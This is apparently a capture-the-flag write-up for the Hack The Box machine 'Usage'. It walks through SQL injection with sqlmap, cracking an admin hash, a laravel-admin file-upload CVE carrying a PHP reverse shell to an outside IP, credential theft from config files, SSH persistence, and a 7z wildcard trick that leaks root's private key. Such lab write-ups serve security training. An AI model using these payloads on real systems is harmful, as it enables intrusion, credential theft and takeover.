# Usage

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.18:22
Open 10.10.11.18:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.10.11.18
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0f8fdd304b807a063dd37dfd7eeca78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfdLKVCM7tItpTAWFFy6gTlaOXOkNbeGIN9+NQMn89HkDBG3W3XDQDyM5JAYDlvDpngF58j/WrZkZw0rS6YqS0=
|   256 bd22f5287727fb65baf6fd2f10c7828f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHr8ATPpxGtqlj8B7z2Lh7GrZVTSsLb6MkU3laICZlTk
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://usage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

![Writeup.png](/assets/pentest/htb/usage/Writeup.png)

The backend is PHP Laravel, nothing much is here tho.

![Writeup-1.png](/assets/pentest/htb/usage/Writeup-1.png)

Nothing on admin too, without any credentials.

![Writeup-2.png](/assets/pentest/htb/usage/Writeup-2.png)

### SQLi

`Forget Password` endpoint is vulnerable to SQLi

![Writeup-3.png](/assets/pentest/htb/usage/Writeup-3.png)

```bash
└─$ sqlmap -u 'http://usage.htb/forget-password' --dbms=MySQL --form --batch --technique=B --level=5 --risk=3 --threads=9 --current-db
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=a19Q3WIsz94weiLyfmmHitG7EsRnvDuODzvLp8f5&email=hacka@usage.htb ' AND 4857=(SELECT (CASE WHEN (4857=4857) THEN 4857 ELSE (SELECT 7802 UNION SELECT 3980) END))-- -
---
current database: 'usage_blog'                                      #'
└─$ sqlmap -u 'http://usage.htb/forget-password' --dbms=MySQL --form --batch --technique=B --level=5 --risk=3 --threads=9 -D usage_blog --tables
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
└─$ sqlmap -u 'http://usage.htb/forget-password' --dbms=MySQL --form --batch --technique=B --level=5 --risk=3 --threads=9 -D usage_blog -T admin_users --dump
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2024-05-17 11:43:11 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------
```

```bash
└─$ hashcat -m 3200 -a 0 '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' $rockyou
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
```

### Admin Panel

> Creds: `admin:whatever1`

Login as admin

![Pasted-image-20241128201614.png](/assets/pentest/htb/usage/Pasted-image-20241128201614.png)

There's a password in logs, but it couldn't be cracked by hashcat: `Token length exception`

![Writeup-5.png](/assets/pentest/htb/usage/Writeup-5.png)

```bash
└─$ cat admin_operation_log.csv|grep pass -i
    ""password"": ""$2y$10$E9.N1P92fYSjJGQDfBrUaO05EHW4BxiQITrqjde\/WQMKnAQ7k2HJK"",
    ""password_confirmation"": ""$2y$10$E9.N1P92fYSjJGQDfBrUaO05EHW4BxiQITrqjde\/WQMKnAQ7k2HJK""
```

### CVE-2023-24249

Discovery: [laravel-admin has Arbitrary File Upload vulnerability](https://github.com/advisories/GHSA-g857-47pm-3r32)
Details: [https://security.snyk.io/vuln/SNYK-PHP-ENCORELARAVELADMIN-3333096](https://security.snyk.io/vuln/SNYK-PHP-ENCORELARAVELADMIN-3333096)
PoC: [https://flyd.uk/post/cve-2023-24249/](https://flyd.uk/post/cve-2023-24249/)

```bash
└─$ weevely generate Password123$ agent.php
Generated 'agent.php' with password 'Password123$' of 781 byte size.
└─$ head ~/Pictures/kraken.png > agent.png.php
└─$ cat agent.php >> agent.png.php
└─$ file agent.png.php
agent.png.php: PNG image data, 512 x 512, 8-bit/color RGBA, non-interlaced
```

Upload valid image, intercept, change filename to `*.php` and add backdoor:

![Writeup-6.png](/assets/pentest/htb/usage/Writeup-6.png)

```php
<?php echo system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.74/4444 0>&1'"); ?>
```

URL: `http://admin.usage.htb/uploads/images/agent.jpg.php`

```bash
└─$ listen
Ncat: Connection from 10.129.97.241:56802.
dash@usage:/var/www/html/project_admin/public/uploads/images$ id
id
uid=1000(dash) gid=1000(dash) groups=1000(dash)
dash@usage:/var/www/html/project_admin$ cat .env | grep -v '=$'
...
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=usage_blog
DB_USERNAME=staff
DB_PASSWORD=s3cr3t_c0d3d_1uth
...
```

### User.txt

```bash
dash@usage:~$ cat user.txt
2fb37c6161b6f3df3170265a79d2c2cb
```
## Privilege Escalation (xander)

Get persistence:
```bash
└─$ ssh-keygen -f id_rsa -P x -q && cat id_rsa.pub
---
dash@usage:~$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPjK+91NurF8ni8QYnrZqsyeKNZM9daY3erW44hfPv2L woyag@kraken' >> ~/.ssh/authorized_keys
---
└─$ ssh dash@usage.htb -i id_rsa
```

### Monit

```
dash@usage:/var/www/html/project_admin$ ss -tlpn4
State     Recv-Q   Send-Q       Local Address:Port         Peer Address:Port       Process
LISTEN    0        1024             127.0.0.1:2812              0.0.0.0:*           users:(("monit",pid=2396,fd=5))
LISTEN    0        70               127.0.0.1:33060             0.0.0.0:*
LISTEN    0        4096         127.0.0.53%lo:53                0.0.0.0:*
LISTEN    0        151              127.0.0.1:3306              0.0.0.0:*
LISTEN    0        128                0.0.0.0:22                0.0.0.0:*
LISTEN    0        511                0.0.0.0:80                0.0.0.0:*           users:(("nginx",pid=1269,fd=6),("nginx",pid=1268,fd=6))
dash@usage:/var/www/html/project_admin$ curl 0:2812
<html><head><title>401 Unauthorized</title></head><body bgcolor=#FFFFFF><h2>Unauthorized</h2>You are not authorized to access monit. Either you supplied the wrong credentials (e.g. bad password), or your browser doesn't understand how to supply the credentials required<hr><a href='http://mmonit.com/monit/'><font size=-1>monit 5.31.0</font></a></body></html>
```

Let's forward the port and see what's there:
```bash
└─$ ssh dash@usage.htb -i id_rsa -L 2812:127.0.0.1:2812
```

The database credentials didn't work. Let's look up the service itself.

> **GENERAL OPERATION** 
> 
> The behavior of Monit is controlled by command-line options and a run control file, monitrc, the syntax of which we describe in a later section. Command-line options override `.monitrc` declarations. 
> The default location for monitrc is `~/.monitrc`. If this file does not exist, Monit will try `/etc/monitrc` and a few other places. See FILES for details. You can also specify the control file directly by using the -c command-line switch to monit. For instance, [source](https://mmonit.com/monit/documentation/monit.html)

The `dash` user has some unusual file which I haven't seen, `monitrc`
```bash
dash@usage:~$ ls -alh
total 52K
drwxr-x--- 6 dash dash 4.0K Nov 28 16:37 .
drwxr-xr-x 4 root root 4.0K Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3.7K Jan  6  2022 .bashrc
drwx------ 3 dash dash 4.0K Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4.0K Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4.0K Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw-r--r-- 1 dash dash    5 Nov 28 16:37 .monit.pid
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw------- 1 dash dash 1.2K Nov 28 16:37 .monit.state
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 2 dash dash 4.0K Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 Nov 28 16:06 user.txt
dash@usage:~$ cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```

> Creds: `admin:3nc0d3d_pa$$w0rd`

![Writeup-7.png](/assets/pentest/htb/usage/Writeup-7.png)

Nothing interesting so far on server, but if we try to login as second user:
```bash
dash@usage:~$ su - xander
Password: 3nc0d3d_pa$$w0rd
xander@usage:~$ id
uid=1001(xander) gid=1001(xander) groups=1001(xander)
```

> Creds: `xander:3nc0d3d_pa$$w0rd`

## Privilege Escalation (root)

```bash
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

2 and 3 we don't know what it really does, but 1st uses 7z to create a backup.
```bash
xander@usage:~$ sudo usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 3
Password has been reset.
xander@usage:~$ sudo usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 2
xander@usage:~$ sudo usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Scanning the drive:
2984 folders, 17951 files, 113880090 bytes (109 MiB)

Creating archive: /var/backups/project.zip

Items to compress: 20935


Files read from disk: 17951
Archive size: 54832258 bytes (53 MiB)
Everything is Ok
xander@usage:~$ ls -alh /var/backups/project.zip
-rw-r--r-- 1 root root 53M Nov 28 16:44 /var/backups/project.zip
```

It's backing up Laravel Project, so nothing which will help us.

7z command seems funny
```bash
xander@usage:/tmp$ strings /usr/bin/usage_management  | grep 7z
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

### 7z

[Wildcards Spare tricks: 7z](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z)

![Writeup-8.png](/assets/pentest/htb/usage/Writeup-8.png)

```bash
xander@usage:/var/www/html$ touch @id_rsa
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7302P 16-Core Processor                (830F10),ASM,AES-NI)

Open archive: /var/backups/project.zip
--
Path = /var/backups/project.zip
Type = zip
Physical Size = 54871238

Scanning the drive:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
```

```bash
└─$ vi root.id_rsa
└─$ chmod 400 root.id_rsa
└─$ ssh root@usage.htb -i root.id_rsa
root@usage:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt 

```bash
root@usage:~# cat root.txt
72091c32ca111fb1aeed9bcbb799ea5d
```